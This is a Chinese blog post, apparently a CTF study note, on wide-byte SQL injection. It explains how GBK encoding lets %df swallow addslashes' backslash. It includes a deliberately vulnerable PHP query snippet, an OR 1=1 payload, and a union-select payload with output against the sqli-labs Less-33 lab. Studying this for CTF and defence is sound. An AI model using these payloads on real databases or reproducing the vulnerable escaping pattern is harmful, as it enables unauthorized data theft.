---
title: "宽字节注入"
date: "2026-05-24T00:00:00+08:00"
lastmod: "2026-05-24T00:00:00+08:00"
slug: "宽字节注入"
summary: "litctf2026遇到了，于是记录学习："
tags:
  - "PHP"
  - "SQL"
params:
  protected: false
  commentId: "宽字节注入"
  legacyId: "宽字节注入"
---
litctf2026遇到了，于是记录学习：

### 1.原理

一般来说，如果开发人员在开发的时候，对传入的参数进行了特殊的函数处理，比如使用了trim()函数，htmlspecialchars()函数，addlashes函数，是可以过滤我们非法提交的参数，从而导致SQL注入无法成功。

作为攻击者，要完成的是对参数的拼接，从而导致恶意的SQL语句写入。作为开发者要完成的是SQL输出参数的一个过滤比如对恶意的字符进行转移。

### 2.常用过滤函数

**trim()函数**
 移除字符串两侧的空白字符或其他预定义字符
 **htmlspecialchars()函数**
 把预定义的字符"<"和">"转换为HTML实体，预防XSS
 **addslashes()函数**
 返回在预定义字符之前添加反斜杠的字符串

### 3.宽字节注入条件

1.数据库为GBK编码
 2.使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符  \  进行转义

### 4.函数代码演示

#### 1.`trim()` 函数的演示

```php
<?php
$input = "  %df'  "; // 包含首尾空格的攻击载荷
$sanitized = trim($input); 

// 输出: %df'
// 结论: trim() 只去掉了空格，危险字符依然被完整保留，无法起到防御作用。
echo "处理后: " . $sanitized;
?>
```

#### 2.`htmlspecialchars()` 函数的演示

```php
<?php
$input = "%df'";
// ENT_QUOTES 表示同时处理单引号和双引号
$sanitized = htmlspecialchars($input, ENT_QUOTES); 

// 输出: %df&#039;
// 结论: 
// 1. 在网页显示时，它确实能防范 XSS。
// 2. 在 SQL 注入中，数据库会将 &#039; 当作普通字符串处理，
//    看起来似乎防住了单引号闭合，但如果后续有 addslashes，情况会变复杂。
echo "处理后: " . $sanitized;
?>
```

#### 3.`addslashes()` 函数的演示

```php
<?php
$input = "%df'"; // 攻击者传入的宽字节组合
$sanitized = addslashes($input); 

// 过程分析:
// 1. addslashes 将 ' 变为 \' (即 %5c%27)
// 2. 结果字符串为 %df%5c%27
// 3. 数据库（GBK模式）检测到 %df%5c，将其合并识别为汉字“運”
// 4. 剩余的 %27 字符（单引号）成功逃逸，造成注入！
echo "处理后: " . $sanitized;
?>
```

### 5.攻击演示

后端处理逻辑是

```php
// 连接数据库，并设置编码为 GBK
mysqli_query($conn, "SET NAMES 'gbk'");
$id = addslashes($_GET['id']);
$sql = "SELECT * FROM users WHERE id = '$id'";
```

则攻击方式是：

```sql
后端处理逻辑
$_GET['id'] 接收到 %df%27 OR 1=1 -- 。

addslashes() 在 ' 前加反斜杠：%df%5c%27 OR 1=1 -- 。

SQL 拼接后：
SELECT * FROM users WHERE id = '運' OR 1=1 -- '

数据库执行：
由于 OR 1=1 恒真，查询会返回数据库中的所有用户数据。
```

### 6.题目例子

#### 1.sql-labs-33

```sql
1%df'
```

回显：

```sql
Welcome    Dhakkan

Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /var/www/html/Less-33/index.php on line 39
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1�\'' LIMIT 0,1' at line 1

```

于是使用

```sql
/Less-33/?id=0%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
```

成功得到想要的结果

```sql
Welcome    Dhakkan
Your Login name:2
Your Password:emails,referers,uagents,users
```

